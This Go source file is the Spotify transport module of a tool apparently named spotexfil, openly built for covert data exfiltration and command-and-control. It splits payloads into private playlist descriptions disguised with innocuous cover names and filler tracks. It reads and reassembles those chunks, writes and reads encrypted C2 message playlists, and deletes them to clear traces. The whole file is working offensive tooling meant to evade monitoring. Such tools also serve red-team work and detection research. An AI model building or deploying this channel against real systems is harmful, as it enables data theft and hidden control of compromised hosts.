package spotify

import (
	"context"
	"encoding/json"
	"fmt"
	"html"
	"math/rand"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/sourcefrenchy/spotexfil/internal/protocol"
	"github.com/sourcefrenchy/spotexfil/internal/shared"
	spotifyapi "github.com/zmb3/spotify/v2"
	spotifyauth "github.com/zmb3/spotify/v2/auth"
	"golang.org/x/oauth2"
)

// Client wraps the Spotify API for covert data transmission.
type Client struct {
	api           *spotifyapi.Client
	userID        string
	useCoverNames bool
}

// spotipy cache file format
type spotipyCache struct {
	AccessToken  string `json:"access_token"`
	TokenType    string `json:"token_type"`
	ExpiresIn    int    `json:"expires_in"`
	Scope        string `json:"scope"`
	ExpiresAt    int64  `json:"expires_at"`
	RefreshToken string `json:"refresh_token"`
}

// NewClient creates an authenticated Spotify client.
// It tries (in order):
//  1. Read cached spotipy token (.cache-<username>)
//  2. Run local OAuth2 callback server for browser-based auth
func NewClient(cfg *Config, useCoverNames bool) (*Client, error) {
	auth := spotifyauth.New(
		spotifyauth.WithClientID(cfg.ClientID),
		spotifyauth.WithClientSecret(cfg.ClientSecret),
		spotifyauth.WithRedirectURL(cfg.RedirectURI),
		spotifyauth.WithScopes(
			spotifyauth.ScopeUserLibraryRead,
			spotifyauth.ScopeUserLibraryModify,
			spotifyauth.ScopePlaylistModifyPrivate,
			spotifyauth.ScopePlaylistReadPrivate,
		),
	)

	// Try cached token first
	token, err := loadCachedToken(cfg, auth)
	if err != nil {
		// No cache — run OAuth2 flow with local callback server
		fmt.Println("[*] No cached token found, starting OAuth2 flow...")
		token, err = runOAuthFlow(cfg, auth)
		if err != nil {
			return nil, fmt.Errorf("OAuth2 auth failed: %w", err)
		}
	}

	ctx := context.Background()
	httpClient := auth.Client(ctx, token)
	api := spotifyapi.New(httpClient)

	// Test the token by making a simple API call
	_, err = api.CurrentUser(ctx)
	if err != nil {
		errStr := strings.ToLower(err.Error())
		if strings.Contains(errStr, "401") || strings.Contains(errStr, "expired") ||
			strings.Contains(errStr, "unauthorized") {
			fmt.Println("[*] Token expired, re-authenticating...")
			token, err = runOAuthFlow(cfg, auth)
			if err != nil {
				return nil, fmt.Errorf("re-auth failed: %w", err)
			}
			httpClient = auth.Client(ctx, token)
			api = spotifyapi.New(httpClient)
		} else if strings.Contains(errStr, "rate") || strings.Contains(errStr, "429") ||
			strings.Contains(errStr, "too many") {
			fmt.Println("[!] Spotify API rate limited — token may be valid but API is throttled")
			fmt.Println("[!] Wait a few minutes and try again")
		} else {
			return nil, fmt.Errorf("API test failed: %w", err)
		}
	} else {
		fmt.Println("[*] API connection verified")
	}

	// Save refreshed token for future use
	_ = saveCachedToken(cfg, token)

	return &Client{
		api:           api,
		userID:        cfg.Username,
		useCoverNames: useCoverNames,
	}, nil
}

// loadCachedToken reads spotipy's .cache-<username> file.
func loadCachedToken(cfg *Config, auth *spotifyauth.Authenticator) (*oauth2.Token, error) {
	cachePaths := []string{
		filepath.Join(".", fmt.Sprintf(".cache-%s", cfg.Username)),
		filepath.Join("..", fmt.Sprintf(".cache-%s", cfg.Username)),
	}
	// Also check home directory
	if home, err := os.UserHomeDir(); err == nil {
		cachePaths = append(cachePaths,
			filepath.Join(home, fmt.Sprintf(".cache-%s", cfg.Username)))
	}

	for _, path := range cachePaths {
		data, err := os.ReadFile(path)
		if err != nil {
			continue
		}

		var cache spotipyCache
		if err := json.Unmarshal(data, &cache); err != nil {
			continue
		}

		token := &oauth2.Token{
			AccessToken:  cache.AccessToken,
			TokenType:    cache.TokenType,
			RefreshToken: cache.RefreshToken,
			Expiry:       time.Unix(cache.ExpiresAt, 0),
		}

		// If expired but we have a refresh token, let oauth2 handle refresh
		if token.RefreshToken != "" {
			fmt.Printf("[*] Loaded cached token from %s\n", path)
			return token, nil
		}

		// If not expired, use directly
		if time.Now().Before(token.Expiry) {
			fmt.Printf("[*] Loaded cached token from %s\n", path)
			return token, nil
		}
	}

	return nil, fmt.Errorf("no valid cached token found")
}

// saveCachedToken writes the token in spotipy cache format.
func saveCachedToken(cfg *Config, token *oauth2.Token) error {
	cache := spotipyCache{
		AccessToken:  token.AccessToken,
		TokenType:    token.TokenType,
		ExpiresIn:    3600,
		Scope:        "user-library-read user-library-modify playlist-modify-private playlist-read-private",
		ExpiresAt:    token.Expiry.Unix(),
		RefreshToken: token.RefreshToken,
	}

	data, err := json.MarshalIndent(cache, "", "    ")
	if err != nil {
		return err
	}

	path := fmt.Sprintf(".cache-%s", cfg.Username)
	return os.WriteFile(path, data, 0600)
}

// runOAuthFlow starts a local HTTP server, opens the browser for auth,
// and captures the callback code.
func runOAuthFlow(cfg *Config, auth *spotifyauth.Authenticator) (*oauth2.Token, error) {
	state := fmt.Sprintf("spotexfil-%d", time.Now().UnixNano())

	codeCh := make(chan string, 1)
	errCh := make(chan error, 1)

	// Parse port from redirect URI
	port := "8888"
	if parts := strings.Split(cfg.RedirectURI, ":"); len(parts) == 3 {
		portPath := parts[2]
		port = strings.Split(portPath, "/")[0]
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/callback", func(w http.ResponseWriter, r *http.Request) {
		code := r.URL.Query().Get("code")
		if code == "" {
			errCh <- fmt.Errorf("no code in callback")
			w.Write([]byte("<h1>Error: no auth code received</h1>"))
			return
		}
		codeCh <- code
		w.Write([]byte("<h1>Auth successful! You can close this tab.</h1>"))
	})

	server := &http.Server{
		Addr:    fmt.Sprintf("127.0.0.1:%s", port),
		Handler: mux,
	}

	go func() {
		if err := server.ListenAndServe(); err != http.ErrServerClosed {
			errCh <- err
		}
	}()

	// Print auth URL for user to open
	url := auth.AuthURL(state)
	fmt.Printf("[*] Open this URL in your browser:\n%s\n\n", url)
	fmt.Println("[*] Waiting for callback...")

	// Wait for callback or error
	select {
	case code := <-codeCh:
		server.Close()
		token, err := auth.Exchange(context.Background(), code)
		if err != nil {
			return nil, fmt.Errorf("token exchange: %w", err)
		}
		fmt.Println("[*] Token obtained successfully")
		return token, nil
	case err := <-errCh:
		server.Close()
		return nil, err
	case <-time.After(120 * time.Second):
		server.Close()
		return nil, fmt.Errorf("OAuth2 timeout (120s)")
	}
}

// GetAllPlaylists fetches ALL user playlists with pagination.
func (c *Client) GetAllPlaylists(ctx context.Context) ([]spotifyapi.SimplePlaylist, error) {
	var all []spotifyapi.SimplePlaylist
	offset := 0
	limit := 50

	for {
		page, err := c.api.GetPlaylistsForUser(ctx, c.userID,
			spotifyapi.Limit(limit), spotifyapi.Offset(offset))
		if err != nil {
			return nil, fmt.Errorf("get playlists: %w", err)
		}
		if len(page.Playlists) == 0 {
			break
		}
		all = append(all, page.Playlists...)
		if page.Next == "" {
			break
		}
		offset += limit
	}
	return all, nil
}

// GenerateCoverName generates an innocuous-looking playlist name.
func GenerateCoverName() string {
	names := shared.Proto.Transport.CoverNames
	name := names[rand.Intn(len(names))]
	chars := "abcdefghijklmnopqrstuvwxyz0123456789"
	suffix := make([]byte, 4)
	for i := range suffix {
		suffix[i] = chars[rand.Intn(len(chars))]
	}
	return fmt.Sprintf("%s #%s", name, string(suffix))
}

// WriteChunks writes payload chunks as playlists with cover names and metadata markers.
func (c *Client) WriteChunks(ctx context.Context, payload string) error {
	if len(payload) > shared.Proto.Transport.MaxPayloadSize {
		return fmt.Errorf("payload too large: %d bytes", len(payload))
	}

	markerSep := shared.Proto.Transport.MarkerSep
	chunkSize := shared.Proto.Transport.ChunkSize
	metaOverhead := 20
	effectiveChunk := chunkSize - metaOverhead

	var chunks []string
	if len(payload) <= effectiveChunk {
		chunks = []string{payload}
	} else {
		for i := 0; i < len(payload); i += effectiveChunk {
			end := i + effectiveChunk
			if end > len(payload) {
				end = len(payload)
			}
			chunks = append(chunks, payload[i:end])
		}
	}

	fmt.Println("[*] Generating playlists")

	for idx, chunk := range chunks {
		i := idx + 1
		var playlistName, description string

		if c.useCoverNames {
			playlistName = GenerateCoverName()
			meta, _ := json.Marshal(map[string]int{"i": i})
			description = chunk + markerSep + string(meta)
		} else {
			playlistName = fmt.Sprintf("%d-payloadChunk", i)
			description = chunk
		}

		playlist, err := c.api.CreatePlaylistForUser(ctx, c.userID,
			playlistName, description, false, false)
		if err != nil {
			return fmt.Errorf("create playlist: %w", err)
		}

		fmt.Printf("\t[*] Created [%d/%d] %s (%d chars)\n",
			i, len(chunks), playlistName, len(chunk))

		// Add filler tracks
		c.addFillerTracks(ctx, playlist.ID)

		time.Sleep(100 * time.Millisecond)
	}

	fmt.Printf("[*] Data encoded and sent (%d playlists)\n", len(chunks))
	return nil
}

// ReadChunks retrieves and reassembles payload from playlists.
func (c *Client) ReadChunks(ctx context.Context) (string, error) {
	fmt.Println("[*] Retrieving playlists")
	markerSep := shared.Proto.Transport.MarkerSep

	playlists, err := c.GetAllPlaylists(ctx)
	if err != nil {
		return "", err
	}

	type indexedChunk struct {
		index int
		data  string
	}

	var payloadChunks []indexedChunk

	for _, p := range playlists {
		full, err := c.api.GetPlaylist(ctx, p.ID)
		if err != nil {
			return "", fmt.Errorf("get playlist %s: %w", p.ID, err)
		}

		name := p.Name
		desc := html.UnescapeString(full.Description)

		isPayload := false
		chunkIndex := 0

		// Legacy format
		if strings.Contains(name, "payloadChunk") {
			isPayload = true
			parts := strings.SplitN(name, "-", 2)
			fmt.Sscan(parts[0], &chunkIndex)
		}

		// New format
		if strings.Contains(desc, markerSep) {
			isPayload = true
			parts := strings.SplitN(desc, markerSep, 2)
			desc = parts[0]
			var meta map[string]int
			if json.Unmarshal([]byte(parts[1]), &meta) == nil {
				chunkIndex = meta["i"]
			}
		}

		if isPayload {
			payloadChunks = append(payloadChunks, indexedChunk{
				index: chunkIndex,
				data:  desc,
			})
			fmt.Printf("\t[*] Retrieved chunk %d: %s\n", chunkIndex, name)
		}
	}

	// Sort by index
	for i := 0; i < len(payloadChunks); i++ {
		for j := i + 1; j < len(payloadChunks); j++ {
			if payloadChunks[j].index < payloadChunks[i].index {
				payloadChunks[i], payloadChunks[j] = payloadChunks[j], payloadChunks[i]
			}
		}
	}

	var sb strings.Builder
	for _, c := range payloadChunks {
		sb.WriteString(c.data)
	}

	fmt.Printf("[*] Retrieved %d chunks\n", len(payloadChunks))
	return sb.String(), nil
}

// DeleteChunks deletes all payload playlists.
func (c *Client) DeleteChunks(ctx context.Context) error {
	markerSep := shared.Proto.Transport.MarkerSep
	playlists, err := c.GetAllPlaylists(ctx)
	if err != nil {
		return err
	}

	count := 0
	for _, p := range playlists {
		name := p.Name
		if strings.Contains(name, "payloadChunk") {
			if err := c.api.UnfollowPlaylist(ctx, p.ID); err == nil {
				count++
			}
			continue
		}

		full, err := c.api.GetPlaylist(ctx, p.ID)
		if err != nil {
			continue
		}
		desc := full.Description
		if strings.Contains(desc, markerSep) {
			if err := c.api.UnfollowPlaylist(ctx, p.ID); err == nil {
				count++
			}
		}
	}

	fmt.Printf("[*] Data cleared (%d playlists removed)\n", count)
	return nil
}

// WriteC2Playlists writes C2 message chunks as playlists.
func (c *Client) WriteC2Playlists(ctx context.Context, encryptedDescs []string) error {
	for _, description := range encryptedDescs {
		name := GenerateCoverName()

		playlist, err := c.api.CreatePlaylistForUser(ctx, c.userID,
			name, description, false, false)
		if err != nil {
			return fmt.Errorf("create playlist: %w", err)
		}

		c.addFillerTracks(ctx, playlist.ID)
		time.Sleep(100 * time.Millisecond)
	}
	return nil
}

// ReadC2Playlists reads and decrypts C2 playlists.
func (c *Client) ReadC2Playlists(ctx context.Context, channel, encryptionKey string, seq int) (map[int][]protocol.ChunkMeta, error) {
	playlists, err := c.GetAllPlaylists(ctx)
	if err != nil {
		return nil, err
	}

	var descPairs []protocol.DescPair
	for _, p := range playlists {
		full, err := c.api.GetPlaylist(ctx, p.ID)
		if err != nil {
			continue
		}
		desc := html.UnescapeString(full.Description)
		descPairs = append(descPairs, protocol.DescPair{
			PlaylistID:  string(p.ID),
			Description: desc,
		})
	}

	return protocol.ReadC2Descriptions(descPairs, encryptionKey, channel, seq), nil
}

// CleanC2Playlists deletes C2 playlists matching channel and optional seq.
func (c *Client) CleanC2Playlists(ctx context.Context, channel, encryptionKey string, seq int) error {
	tag := protocol.ComputeC2Tag(encryptionKey)
	playlists, err := c.GetAllPlaylists(ctx)
	if err != nil {
		return err
	}

	for _, p := range playlists {
		full, err := c.api.GetPlaylist(ctx, p.ID)
		if err != nil {
			continue
		}

		desc := html.UnescapeString(full.Description)
		if !strings.HasPrefix(desc, tag) {
			continue
		}

		meta, _, err := protocol.DecryptChunkDesc(desc, encryptionKey)
		if err != nil {
			continue
		}

		if ch, ok := meta["c"].(string); ok && ch != channel {
			continue
		}
		if seq >= 0 {
			if s, ok := meta["seq"].(float64); ok && int(s) != seq {
				continue
			}
		}

		_ = c.api.UnfollowPlaylist(ctx, p.ID)
	}
	return nil
}

// addFillerTracks adds random filler tracks to a playlist for cover.
func (c *Client) addFillerTracks(ctx context.Context, playlistID spotifyapi.ID) {
	artists := shared.Proto.Transport.FillerArtists
	artist := artists[rand.Intn(len(artists))]

	results, err := c.api.Search(ctx, fmt.Sprintf("artist:%s", artist),
		spotifyapi.SearchTypeArtist, spotifyapi.Limit(1))
	if err != nil || len(results.Artists.Artists) == 0 {
		return
	}

	artistID := results.Artists.Artists[0].ID
	topTracks, err := c.api.GetArtistsTopTracks(ctx, artistID, "US")
	if err != nil || len(topTracks) == 0 {
		return
	}

	count := 5
	if len(topTracks) < count {
		count = len(topTracks)
	}

	trackIDs := make([]spotifyapi.ID, count)
	for i := 0; i < count; i++ {
		trackIDs[i] = topTracks[i].ID
	}

	_, _ = c.api.AddTracksToPlaylist(ctx, playlistID, trackIDs...)
}
